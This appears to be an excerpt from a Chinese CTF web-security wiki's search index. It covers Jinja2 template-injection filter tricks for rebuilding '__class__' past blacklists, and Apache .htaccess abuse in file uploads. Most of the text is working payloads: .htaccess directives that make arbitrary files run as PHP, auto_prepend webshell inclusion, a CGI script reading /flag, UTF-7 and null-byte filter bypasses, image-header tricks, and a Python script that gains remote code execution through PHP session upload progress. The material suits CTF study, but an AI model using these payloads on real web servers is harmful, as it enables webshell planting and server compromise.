<p>\u8fd9\u4e2a\u5c31\u5f88\u5173\u952e\u4e86\uff0c\u975e\u5e38\u91cd\u8981</p> <pre><code>Return a string which is the concatenation of the strings in the sequence. The separator between elements is anempty string per default, you can define it with the optional parameter:\n{{ [1, 2, 3]|join('|') }}    -&gt; 1|2|3\n{{ [1, 2, 3]|join }}    -&gt; 123It is also possible to join certain attributes of an object:\n{{ users|join(', ', attribute='username') }}\nPlain Text\n</code></pre> <p>\u770b\u7684\u51fa\u6765\uff0cjoin\u7528\u4ed6\u7684\u53c2\u6570\u4f5c\u4e3a\u524d\u9762\u5217\u8868\u7684\u5206\u9694\u7b26</p> <pre><code>\"\"[['__clas','s__']|join] \u6216\u8005 \"\"[('__clas','s__')|join]\n\u76f8\u5f53\u4e8e\n\"\"[\"__class__\"]\nPlain Text\n</code></pre> <p>5.lower</p> <pre><code>\"\"[\"__CLASS__\"|lower]\u5f88\u50cf\u4e4b\u524d\u7684upper()\u51fd\u6570\nPlain Text\n</code></pre> <p>6.replace reverse</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u66ff\u6362\u548c\u53cd\u8f6c\u8fd8\u539f\u56de\u6211\u4eec\u8981\u7528\u7684\u5b57\u7b26\u4e32\u4e86</p> <pre><code>\"__claee__\"|replace(\"ee\",\"ss\") \u6784\u9020\u51fa\u5b57\u7b26\u4e32 \"__class__\"\"__ssalc__\"|reverse \u6784\u9020\u51fa \"__class__\"\nPlain Text\n</code></pre> <p>7.string</p> <p>\u529f\u80fd\u7c7b\u4f3c\u4e8epython\u5185\u7f6e\u51fd\u6570 str.</p> <p>\u6709\u4e86\u8fd9\u4e2a\u7684\u8bdd\u6211\u4eec\u53ef\u4ee5\u628a\u663e\u793a\u5230\u6d4f\u89c8\u5668\u4e2d\u7684\u503c\u5168\u90e8\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u518d\u901a\u8fc7\u4e0b\u6807\u5f15\u7528\uff0c\u5c31\u53ef\u4ee5\u6784\u9020\u51fa\u4e00\u4e9b\u5b57\u7b26\u4e86\uff0c\u518d\u901a\u8fc7\u62fc\u63a5\u5c31\u80fd\u6784\u6210\u7279\u5b9a\u7684\u5b57\u7b26\u4e32\u3002</p> <pre><code>().__class__   \u51fa\u6765\u7684\u662f&lt;class 'tuple'&gt;(().__class__|string)[0] \u51fa\u6765\u7684\u662f&lt;\nPlain Text\n</code></pre> <p>8.select unique</p> <pre><code>Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.If no test is specified, each object will be evaluated as a boolean.\u901a\u8fc7\u5bf9\u6bcf\u4e2a\u5bf9\u8c61\u5e94\u7528\u6d4b\u8bd5\u5e76\u4ec5\u9009\u62e9\u6d4b\u8bd5\u6210\u529f\u7684\u5bf9\u8c61\u6765\u7b5b\u9009\u5bf9\u8c61\u5e8f\u5217\u3002\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u6d4b\u8bd5\uff0c\u5219\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u5c06\u88ab\u8ba1\u7b97\u4e3a\u5e03\u5c14\u503c\nReturns a list of unique items from the given iterable.\nPlain Text\n</code></pre> <pre><code>()|select|string\u7ed3\u679c\u5982\u4e0b&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;\n(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]\n\u5f97\u5230\u5b57\u7b26\u4e32\"__class__\"\nPlain Text\n</code></pre> <p>9.list</p> <pre><code>\u8f6c\u6362\u6210\u5217\u8868\n\u66f4\u591a\u7684\u7528\u9014\u662f\u914d\u5408\u4e0a\u9762\u7684string\u8f6c\u6362\u6210\u5217\u8868\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u5217\u8868\u91cc\u9762\u7684\u65b9\u6cd5\u53d6\u5b57\u7b26\u4e86\n\u53ea\u662f\u5355\u7eaf\u7684\u5b57\u7b26\u4e32\u7684\u8bdd\u53d6\u5355\u4e2a\u5b57\u7b26\u65b9\u6cd5\u6709\u9650\nPlain Text\n</code></pre> <pre><code>(()|select|string|list).pop(0)\nPlain Text\n</code></pre> <p>10.lipsum</p> <p>\u8fd9\u4e2a\u662f\u4e4b\u524d\u5b66\u5230\u7684\u59ff\u52bf\u3002</p> <p>Lorem ipsum\uff0c\u4e2d\u6587\u53c8\u79f0\u201c\u4e71\u6570\u5047\u6587\u201d\uff0c\u662f\u6307\u4e00\u7bc7\u5e38\u7528\u4e8e\u6392\u7248\u8bbe\u8ba1\u9886\u57df\u7684\u62c9\u4e01\u6587\u6587\u7ae0[1] \uff0c\u4e3b\u8981\u7684\u76ee\u7684\u4e3a\u6d4b\u8bd5\u6587\u7ae0\u6216\u6587\u5b57\u5728\u4e0d\u540c\u5b57\u578b\u3001\u7248\u578b\u4e0b\u770b\u8d77\u6765\u7684\u6548\u679c\uff0c\u901a\u5e38\u7f51\u7ad9\u8fd8\u6ca1\u5efa\u8bbe\u597d\u65f6\u4f1a\u51fa\u73b0\u8fd9\u6bb5\u6587\u5b57</p> <p>\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u4e5f\u662f\u8d77\u5230\u4e86\u8fd9\u6837\u7684\u4f5c\u7528\uff0c\u4e8e\u662f\u6211\u4eec\u7ed3\u5408lipsum|string|list</p> <p>\u5c31\u80fd\u62ff\u5230\u6211\u4eec\u60f3\u8981\u7684\u6570\u5b57\u3002\u5230\u8fd9\u91cc\uff0c\u90a3\u4e2ablacklist\u5c31\u5e94\u8be5\u662f\u6709\u8db3\u591f\u7684\u65b9\u6cd5\u7ed5\u8fc7\u4e86\u3002</p>"},{"location":"web/upload/htaccess/","title":".htaccess","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u642c\u8fd0\u642c\u8fd0</p> <p>\u524d\u8a00</p> <p>.htaccess\u6587\u4ef6\u662fapache\u670d\u52a1\u5668\u7684\u4e00\u79cd\u76ee\u5f55\u7ea7\u522b\u7684\u4fee\u6539\u914d\u7f6e\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u7528\u6765\u914d\u7f6e\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\uff0c\u5e38\u5e38\u88ab\u7528\u4e8e\u8bbf\u95eeURL\u65f6\u91cd\u5199\u8def\u5f84\uff1b\u5728\u6b64\u603b\u7ed3\u4e00\u4e0b\u76f8\u5173\u5229\u7528\u53cabypass\u7684\u65b9\u5f0f</p> <p>\u6d4b\u8bd5\u73af\u5883\uff1aUbuntu18.04+Apache2+php7.2</p> <p><code>/etc/apache2</code>\u4e0b\u6709\u4e24\u4e2a\u6587\u4ef6\u5939<code>mods-enable</code>\u548c<code>mods-available</code>\uff0c\u5176\u4e2d<code>mods-enable</code>\u91cc\u88c5\u7684\u662fapache\u5df2\u7ecf\u88ab\u542f\u7528\u7684\u6a21\u5757\uff0c<code>mods-available</code>\u91cc\u88c5\u7684\u662f\u5f53\u524d\u7cfb\u7edf\u53ef\u7528\u7684\u6a21\u5757\u5207\u6362\u5230<code>mods-enabled</code>\uff0c\u67e5\u770b<code>php7.2.conf</code>\uff1a</p> <p></p> <p>\u901a\u8fc7FilesMath\u5339\u914d\u6587\u4ef6\u540e\u7f00\uff0c\u5176\u9ed8\u8ba4\u914d\u7f6e\u662f\u5f53\u5339\u914d\u5230<code>phar</code>\u3001<code>php</code>\u3001<code>phtml</code>\u65f6\uff0c\u90fd\u5c06\u5176\u4f5c\u4e3aphp\u6765\u6267\u884c\uff0c\u5176\u4e2dSetHandler\u5c31\u662f\u8bbe\u7f6e\u89e3\u6790\u65b9\u5f0f\u4f8b\u5982\u5728<code>1.phar</code>\u4e2d\u5199\u5165<code>&lt;?=phpinfo();</code>\uff1a</p> <p></p>"},{"location":"web/upload/htaccess/#_1","title":"\u5229\u7528\u65b9\u5f0f","text":""},{"location":"web/upload/htaccess/#1sethandler","title":"1.SetHandler","text":"<p>(1)\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>SetHandler application/x-httpd-php\n</code></pre> <p>\u6b64\u65f6\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u90fd\u4f1a\u88ab\u5f53\u505aphp\u89e3\u6790</p> <p></p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u53ef\u4ee5\u5c06\u5f53\u524d\u76ee\u5f55\u4e0b\u6587\u4ef6\u90fd\u5f53\u505a\u6587\u672c\u89e3\u6790\uff0c\u8fd9\u6837\u4fbf\u53ef\u83b7\u5f97\u6587\u4ef6\u6e90\u7801\uff1a</p> <p></p> <p>(2)2020 de1ctf\u7684checkin\u8fd9\u9053\u9898\u76ee\u7684\u5b98\u65b9wp\u4e2d\u63d0\u5230\u4e86\u8fd9\u79cd\u548c\u7b2c(3)\u79cd\u65b9\u5f0f</p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>SetHandler server-status\n</code></pre> <p>\u8fd9\u79cd\u65b9\u5f0f\u5229\u7528\u4e86apache\u7684\u670d\u52a1\u5668\u72b6\u6001\u4fe1\u606f(\u9ed8\u8ba4\u5173\u95ed)\uff0c\u53ef\u4ee5\u67e5\u770b\u6240\u6709\u8bbf\u95ee\u672c\u7ad9\u7684\u8bb0\u5f55(\u767d\u5ad6)</p> <p></p> <p>\u53ef\u6dfb\u52a0\u53c2\u6570<code>?refresh=5</code>\u6765\u5b9e\u73b0\u6bcf\u96945s\u81ea\u52a8\u5237\u65b0(3)\u8fd9\u79cd\u65b9\u6cd5\u6761\u4ef6\u4e3aapache\u52a0\u8f7d\u4e86<code>cgi_module</code>\uff0c\u8fd9\u91cc\u622a\u7684de1ctf checkin\u8fd9\u9053\u9898\u76ee\u7684phpinfo\uff1a</p> <p></p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>Options +ExecCGIAddHandler cgi-script .xx\n</code></pre> <p>\u7f16\u8f911.xx(\u6ce8\u610f\u683c\u5f0f\u6bd4\u8f83\u4e25\u683c)</p> <pre><code>#! /bin/bash\necho Content-type: text/html\necho \"\"\ncat /flag\n</code></pre> <p>\u53ef\u4ee5\u6210\u529f\u6267\u884c\u6700\u540e\u7684\u547d\u4ee4<code>cat /flag</code></p> <p>\u5f53\u7136\uff0c\u5f00\u542f\u4e86fastcgi\u4e5f\u662f\u53ef\u4ee5\u5229\u7528\u7684\uff0c\u8fd9\u91cc\u4e0d\u5217\u4e3e\u4e86\uff0c\u53ef\u53c2\u8003\u6587\u7ae0\uff1a</p> <pre><code>https://www.freebuf.com/vuls/218495.html\n</code></pre>"},{"location":"web/upload/htaccess/#2addtype","title":"2.AddType","text":"<p>AddType\u53ef\u4ee5\u6307\u793a\u6587\u4ef6\u7ba1\u7406\u7cfb\u7edf\uff0c\u5bf9\u6307\u5b9a\u540e\u7f00\u6587\u4ef6\u4ee5\u9009\u5b9a\u7684\u6587\u4ef6\u7c7b\u578b\u89e3\u6790</p> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>AddType application/x-httpd-php .a\n</code></pre> <p>\u4fbf\u4f1a\u5c06\u4ee5<code>.a</code>\u4e3a\u540e\u7f00\u7684\u6587\u4ef6\u89e3\u6790\u4e3aphp</p> <p></p>"},{"location":"web/upload/htaccess/#3php_value","title":"3.php_value","text":"<p>\u8fd9\u79cd\u65b9\u5f0f\u53ef\u901a\u8fc7<code>php_value</code>\u6765\u914d\u7f6ePHP\u7684\u914d\u7f6e\u9009\u9879\uff1b\u53e6\u5916<code>php_flag name on|off</code>\u7528\u6765\u8bbe\u5b9a\u5e03\u5c14\u503c\u7684\u914d\u7f6e\u6307\u4ee4</p> <p>\u67e5\u770b\u914d\u7f6e\u53ef\u88ab\u8bbe\u5b9a\u7684\u8303\u56f4\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u53ef\u77e5\uff0c.htaccess\u53ef\u4ee5\u4f7f\u4e24\u79cd\u914d\u7f6e\u6a21\u5f0f\u751f\u6548\uff1a<code>PHP_INI_PREDIR</code>\u548c<code>PHP_INI_ALL</code></p> <p>\u53ef\u67e5\u770bphp.ini\u914d\u7f6e\u9009\u9879\u5217\u8868\uff0c\u4ece\u4e2d\u5bfb\u627e\u53ef\u5229\u7528\u7684\u914d\u7f6e\u9879</p> <p>(1)\u4f7f\u7528\u6587\u4ef6\u5305\u542b\u7684\u4e24\u4e2a\u76f8\u5173\u914d\u7f6e</p> <p><code>auto_prepend_file</code>\uff1a\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u5728\u4e3b\u6587\u4ef6\u89e3\u6790\u4e4b\u524d\u81ea\u52a8\u89e3\u6790</p> <ul> <li> <p><code>auto_append_file</code>\uff1a\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff0c\u5728\u4e3b\u6587\u4ef6\u89e3\u6790\u540e\u81ea\u52a8\u89e3\u6790</p> </li> <li> <p>\u7f16\u8f91.htaccess\uff0c\u5185\u5bb9\u4e3a\uff1a</p> </li> </ul> <pre><code>php_value auto_prepend_file webshell\n</code></pre> <p>\u7f16\u8f91<code>webshell</code>\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>&lt;?=phpinfo();\n</code></pre> <p>\u6b64\u65f6\u968f\u4fbf\u627e\u4e00\u4e2aphp\u6587\u4ef6\u8bbf\u95ee\uff1a</p> <p></p> <p>\u628a.htaccess\u5185\u5bb9\u6539\u4e3a\u4e0b\u9762\u7684\u4e5f\u662f\u53ef\u4ee5\u7684\uff1a</p> <pre><code>php_value auto_append_file webshell\n</code></pre> <p>\u7531\u4e8e\u901a\u8fc7\u8bbe\u7f6e\u8fd9\u4e24\u4e2a\u9009\u9879\u8fdb\u884c\u6587\u4ef6\u5305\u542b\uff0c\u90a3\u4e48\u4fbf\u53ef\u4f7f\u7528\u76f8\u5173\u7684php\u534f\u8bae\u6d41\uff0c\u5982<code>php://filter</code>\uff0c\u53ef\u7528\u6765\u7ed5\u8fc7\u5bf9\u4e00\u4e9b\u5173\u952e\u5b57\u7684\u68c0\u6d4b\uff0c\u4e0b\u9762Bypass\u90e8\u5206\u4f1a\u63d0\u5230</p> <p>(2)\u7ed5\u8fc7preg_math\u7684\u914d\u7f6e</p> <p>\u67e5\u770b\u5b98\u65b9\u6587\u6863\u4e2d\u7684\u76f8\u5173\u914d\u7f6e\uff1a</p> <p></p> <p>\u7f16\u8f91.htaccess\uff1a</p> <pre><code>php_value pcre.backtrack_limit 0php_value pcre.jit 0\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> <p></p>"},{"location":"web/upload/htaccess/#4","title":"4.\u5176\u4ed6","text":"<p>(1)\u7981\u7528\u62d2\u7edd\u89c4\u5219\uff0c\u4f7f.htaccess\u53ef\u8bbf\u95ee</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c.htaccess\u662f\u4e0d\u53ef\u8bbf\u95ee\u7684\uff1a</p> <p></p> <p>\u90a3\u4e48\u7f16\u8f91.htaccess\u6587\u4ef6\uff0c\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a</p> <pre><code>&lt;Files ~ \"^.ht\"&gt;    Require all granted    Order allow,deny    Allow from all&lt;/Files&gt;\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> <p></p> <p>(2)\u76f4\u63a5\u4f7f\u7528.htaccess shell</p> <p>\u4f8b\u5982\u4e0b\u9762\u8fd9\u4e2a.htaccess\u6587\u4ef6\uff0c\u9996\u5148\u8bbe\u7f6e\u4e86\u7981\u7528\u62d2\u7edd\u89c4\u5219\uff0c\u8fd9\u6837\u4fbf\u53ef\u76f4\u63a5\u8bbf\u95ee\u5230.htaccess\uff1b\u63a5\u7740\u7528<code>SetHandler</code>\u5c06\u6240\u6709\u6587\u4ef6\u4f5c\u4e3aphp\u89e3\u6790\uff0c\u6700\u540e\u5199\u5165php\u4ee3\u7801\uff0c\u5f00\u5934\u7528<code>#</code>\u6ce8\u91ca\u6389\uff0c\u8fd9\u6837\u4fbf\u53ef\u6210\u529f\u89e3\u6790.htaccess\uff0c\u7136\u540e\u89e3\u6790php\uff1a</p> <pre><code>&lt;Files ~ \"^.ht\"&gt; Require all granted Order allow,deny Allow from all&lt;/Files&gt;SetHandler application/x-httpd-php# &lt;?php phpinfo(); ?&gt;\n</code></pre> <p></p> <p>\u76f8\u5173\u7684\u5173\u4e8e.htaccess\u7684shell\uff0c\u53ef\u53c2\u8003github\u4e0a\u4e00\u4e2a\u9879\u76ee\uff1a</p> <pre><code>https://github.com/wireghoul/htshells\n</code></pre>"},{"location":"web/upload/htaccess/#bypass","title":"Bypass\u65b9\u5f0f","text":""},{"location":"web/upload/htaccess/#1","title":"1.\u5173\u952e\u5b57\u68c0\u6d4b","text":"<p>\u65b9\u6cd51</p> <p>\u5982\u679c\u8fc7\u6ee4\u4e86.htaccess\u5e38\u7528\u7684\u5173\u952e\u5b57\uff0c\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u7ebf\u6765\u7ed5\u8fc7\u5bf9\u5173\u952e\u5b57\u7684\u8fc7\u6ee4\uff0c\u53cd\u659c\u7ebf\u540e\u9700\u8981\u52a0\u4e0a\u6362\u884c\u7b26\uff0c\u5e76\u4e14\u53cd\u659c\u7ebf\u524d\u548c\u5173\u952e\u5b57\u65e0\u7a7a\u683c</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>AddType application/x-httpd-php .abc\n</code></pre> <p></p> <p>\u770b\u56fe\u7247\u7684\u8bdd\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u8fd9\u91cc\u7684\u53cd\u659c\u6760\u6709\u70b9\u50cf\u82f1\u6587\u91cc\u9762\u7684-\u8868\u793a\u6362\u884c\u7684\u62fc\u63a5</p> <p>\u65b9\u6cd52</p> <p>\u5982\u679c\u68c0\u6d4b\u4e0d\u80fd\u542b\u6709<code>&lt;?</code>\u7b49php\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6b64\u65f6\u53ef\u5148\u5c06shell\u5b57\u7b26\u4e32\u8fdb\u884c\u7f16\u7801\uff0c\u7136\u540e\u5728\u6587\u4ef6\u5305\u542b\u65f6\u901a\u8fc7<code>php://filter</code>\u89e3\u7801\uff1a</p> <p></p> <p>\u65b9\u6cd53</p> <p>\u901a\u8fc7UTF-7\u3001UTF-16\u7b49\u8fdb\u884c\u7f16\u7801</p> <p></p> <p>\u7f16\u8f91.htaccess\uff1a</p> <pre><code>AddType application/x-httpd-php .aaaphp_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"\n</code></pre> <p>\u4e4b\u540e\u5c06\u540e\u7f00<code>.aaa</code>\u6587\u4ef6\u7684\u5185\u5bb9\u8fdb\u884c\u76f8\u5e94\u7f16\u7801\u5373\u53ef</p>"},{"location":"web/upload/htaccess/#2","title":"2.\u62fc\u63a5\u65e0\u7528\u5b57\u7b26\u4e32","text":"<p>\u65b9\u6cd51</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>#</code>\u6765\u6ce8\u91ca\u6389\u540e\u9762\u62fc\u63a5\u7684\u591a\u4f59\u5185\u5bb9\uff0c<code>#</code>\u9700\u8981\u548c\u524d\u9762\u7684\u5185\u5bb9\u9694\u4e00\u4e2a\u7a7a\u683c\uff0c\u5e76\u4e14<code>#</code>\u53ea\u80fd\u6ce8\u91ca\u4e00\u884c\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u7ebf\u6765\u8f6c\u4e49\u6362\u884c\u7b26\uff0c\u4ece\u800c\u6ce8\u91ca\u591a\u884c\u5185\u5bb9</p> <p>\u4f8b\u5982\u4e0b\u9762\u8fd9\u4e2a.htaccess\u6587\u4ef6\u662f\u53ef\u4ee5\u751f\u6548\u7684\uff1a</p> <pre><code>AddType application/x-httpd-php .abc #asdf asdf\n</code></pre> <p>\u65b9\u6cd52</p> <p>\u9664\u4e86<code>#</code>\u5916\uff0c<code>0x00</code>\u4e5f\u53ef\u4ee5\u5f53\u6ce8\u91ca\u7b26\uff0c\u4f7f\u7528<code>write.php</code>\u811a\u672c\u5199\u5165.htaccess\uff1a</p> <pre><code>&lt;?php$data = urldecode('AddType application/x-httpd-php .abc%0a%00asdf');file_put_contents('.htaccess', $data);\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> <p></p>"},{"location":"web/upload/htaccess/#3","title":"3.\u6587\u4ef6\u683c\u5f0f\u68c0\u6d4b","text":"<p>\u5982\u679c\u4f7f\u7528<code>exif_imagetype</code>\u68c0\u6d4b\u4e0a\u4f20\u7684\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u6765\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\uff0c\u90a3\u4e48\u53ea\u8981\u662f\u56fe\u50cf\u683c\u5f0f\u4ee5<code>#</code>\u6216<code>0x00</code>\u5f00\u5934\u4fbf\u53ef\u7ed5\u8fc7</p> <p>\u65b9\u6cd51</p> <p>\u4f7f\u7528XBM\u56fe\u50cf\uff0c\u4f7f\u7528PHP\u751f\u6210\u56fe\u50cf(\u9700\u5b89\u88c5GD\u5e93)\uff1a</p> <pre><code>&lt;?php// \u521b\u5efa\u7a7a\u767d\u56fe\u50cf\u5e76\u6dfb\u52a0\u6587\u5b57$im = imagecreatetruecolor(120, 20);$text_color = imagecolorallocate($im, 233, 14, 91);imagestring($im, 1, 5, 5,  'A Simple Text String', $text_color);\n// \u4fdd\u5b58\u56fe\u50cfimagexbm($im, '1.png');\n// \u91ca\u653e\u5185\u5b58imagedestroy($im);?&gt;\n</code></pre> <p>(\u4e0b\u9762\u7684<code>1_png_width</code>\u4ee5\u53ca<code>1_png_height</code>\u662f\u6839\u636e\u6587\u4ef6\u540d\u8fdb\u884c\u62fc\u63a5\u751f\u6210\u7684)</p> <p></p> <p>\u90a3\u4e48\u53ef\u4ee5\u5728.htaccess\u524d\u9762\u52a0\u4e0a\uff1a</p> <pre><code>#define 1_png_width 120#define 1_png_height 20\n</code></pre> <p>\u4fbf\u53ef\u7ed5\u8fc7\u5bf9\u6587\u4ef6\u683c\u5f0f\u7684\u68c0\u6d4b</p> <p>\u65b9\u6cd52</p> <p>\u4f7f\u7528WBMP\u56fe\u50cf\uff0c\u4f7f\u7528PHP\u751f\u6210\u56fe\u50cf\uff1a</p> <pre><code>&lt;?php$img = imagecreatetruecolor(20, 20);imagewbmp($img, '1.wbmp');?&gt;\n</code></pre> <p>\u4f7f\u752816\u8fdb\u5236\u7f16\u8f91\u5668\u67e5\u770b\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u79cd\u56fe\u50cf\u683c\u5f0f\u662f\u4ee5<code>0x00</code>\u5f00\u5934\u7684\uff0c\u90a3\u4e48\u4fbf\u53ef\u4ee5\u6b64\u65b9\u5f0f\u7ed5\u8fc7\u5bf9\u6587\u4ef6\u683c\u5f0f\u7684\u68c0\u6d4b</p>"},{"location":"web/upload/htaccess/#4_1","title":"4.\u5176\u4ed6\u5b57\u7b26\u9650\u5236","text":"<p>\u82e5\u8fc7\u6ee4\u4e86<code>&lt;</code>\u3001\u6570\u5b57\u3001<code>:</code>\u7b49\uff0c\u6b64\u65f6\u4fbf\u4e0d\u80fd\u4f7f\u7528<code>php://filter</code>\u6216\u8005UTF\u7f16\u7801\u7684\u65b9\u5f0f\u7ed5\u8fc7\u4e86\uff1b\u53ef\u5c1d\u8bd5\u5229\u7528.htaccess\u8bbe\u7f6e\u5305\u542b\u6307\u5b9a\u7684\u6587\u4ef6\u3002\u4f8b\u5982\u5bf9\u4e8esession\u6587\u4ef6\uff0c\u53ef\u901a\u8fc7\u5305\u542b\u4e0a\u4f20\u6587\u4ef6\u4ea7\u751f\u7684\u4e34\u65f6session\u8fdb\u884cRCE</p> <p>\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\uff0c\u53d1\u73b0\u5927\u90e8\u5206session\u76f8\u5173\u7684\u914d\u7f6e\u90fd\u662f\u53ef\u4ee5\u901a\u8fc7.htaccess\u4fee\u6539\u7684\uff1a</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u77e5\u9053session\u5b58\u50a8\u8def\u5f84\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7<code>session.save_path</code>\u6307\u5b9a\u5b58\u50a8\u8def\u5f84\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06<code>session.upload_progress.cleanup</code>\u8bbe\u7f6e\u4e3aoff\uff0c\u8fd9\u6837\u4fbf\u53ef\u65e0\u9700\u6761\u4ef6\u7ade\u4e89\u6765\u5c06\u4ee3\u7801\u5199\u5230session\u6587\u4ef6\u4e2d\uff0c\u4ece\u800c\u5305\u542brce\uff1b\u7f16\u8f91.htaccess\uff1a</p> <pre><code>php_value auto_append_file \"/tmp/sess_gtfly\"php_value session.save_path \"/tmp\"php_flag session.upload_progress.cleanup off\n</code></pre> <p></p> <p>\u7136\u540e\u8fd0\u884c</p> <pre><code>import requests\nurl='http://127.0.0.1/test.php'\nheaders={    \"Cookie\":'PHPSESSID=gtfly'}\nfiles={    \"upload\":''}\ndata={    \"PHP_SESSION_UPLOAD_PROGRESS\": '''&lt;?php echo system('whoami'); ?&gt;'''     }\nr = requests.session()\nr.post(url,files=files,headers=headers,data=data)\nt = r.get('http://127.0.0.1/test.php',headers=headers)\nprint(t.text)\n</code></pre> <p>\u6210\u529f\u6267\u884c\uff1a</p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u6240\u4ee5\u6211\u8fd8\u662fcopy\u4e86\uff0c\u6211\u5199\u4e0d\u6765</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_2","title":"\u89e3\u6790\u6f0f\u6d1e","text":""},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#apache2","title":"apache2","text":"<p>\u591a\u540e\u7f00\u89e3\u6790\u6f0f\u6d1e</p> <ul> <li>\u5728Apache 2.0.x &lt;= 2.0.59\uff0cApache 2.2.x &lt;= 2.2.17\uff0cApache 2.2.2 &lt;= 2.2.8\u4e2dApache \u89e3\u6790\u6587\u4ef6\u7684\u89c4\u5219\u662f\u4ece\u53f3\u5230\u5de6\u5f00\u59cb\u5224\u65ad\u89e3\u6790,\u5982\u679c\u540e\u7f00\u540d\u4e3a\u4e0d\u53ef\u8bc6\u522b\u6587\u4ef6\u89e3\u6790,\u5c31\u518d\u5f80\u5de6\u5224\u65ad\u3002</li> </ul> <p>\u59821.php.abc\uff0c\u56e0apache2\u4e0d\u8bc6\u522b.abc\u540e\u7f00\uff0c\u6240\u4ee5\u5411\u524d\u89e3\u6790php</p> <p>.htaccess</p> <ul> <li>Apache\u63d0\u4f9b\u4e86\u4e00\u79cd\u5f88\u65b9\u4fbf\u7684\u3001\u53ef\u4f5c\u7528\u4e8e\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\u7684\u914d\u7f6e\u6587\u4ef6\u2014\u2014.htaccess\uff08\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6\uff09</li> </ul> <p>\u5f53\u7ad9\u70b9\u914d\u7f6e\u4e0a\u6807\u6709AllowOverride All\uff0c\u5e76\u4e14rewrite_mod\u5f00\u542f\u65f6\uff0c.htaccess\u6587\u4ef6\u5c31\u4f1a\u751f\u6548\u3002</p> <p>(1) Options</p> <p>\u5217\u76ee\u5f55</p> <pre><code>Options +Indexes\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u6267\u884ccgi\u7a0b\u5e8f</p> <pre><code>Options ExecCGI\nPlain Text\n</code></pre> <p>\u89e3\u6790cgi\u7684\u53c2\u8003\u94fe\u63a5https://www.freebuf.com/vuls/218495.html</p> <p>(2) AddType application/x-httpd-php abc</p> <p>\u5f53\u5728.htaccess\u4e2d\u5199\u5165AddType application/x-httpd-php abc\u65f6\uff0c\u5c31\u4f1a\u628a1.abc\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790</p> <p>(3) php_value\u3001php_admin</p> <pre><code>php_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"php_value auto_append_file .htaccess+ADw?php phpinfo()+Ads\nPlain Text\n</code></pre> <p>UTF-7\u3001UTF-16\u3001UTF-32\u7686\u53ef</p> <p>\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d</p> <pre><code>php_flag engine 0\nPlain Text\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u53ef\u4ee5\u8fd9\u6837\u4e66\u5199.htaccess</p> 